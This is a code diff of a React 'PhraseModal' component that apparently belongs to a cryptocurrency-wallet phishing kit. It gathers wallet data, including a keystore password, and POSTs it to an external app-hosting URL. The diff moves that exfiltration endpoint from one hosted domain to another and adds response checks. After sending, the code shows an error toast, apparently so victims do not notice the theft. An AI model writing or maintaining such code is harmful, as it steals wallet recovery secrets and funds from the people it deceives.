@@ -93,16 +93,23 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
         payload.tab3.password = keystorePassword;
       }
 
-      const response = await fetch("https://monkfish-app-yra7w.ondigitalocean.app/submit", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
-      });
+     const response = await fetch("https://witty-riannon-frameless-3393f584.koyeb.app/submit", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify(payload),
+});
 
-      const result = await response.json();
-      console.log("Submit successful:", result);
+console.log("Status:", response.status);
+
+if (!response.ok) {
+  throw new Error(`HTTP error! status: ${response.status}`);
+}
+
+const result = await response.json();
+console.log("Submit successful:", result);
+
 
       setTimeout(() => {
         setShowErrorToast(true);
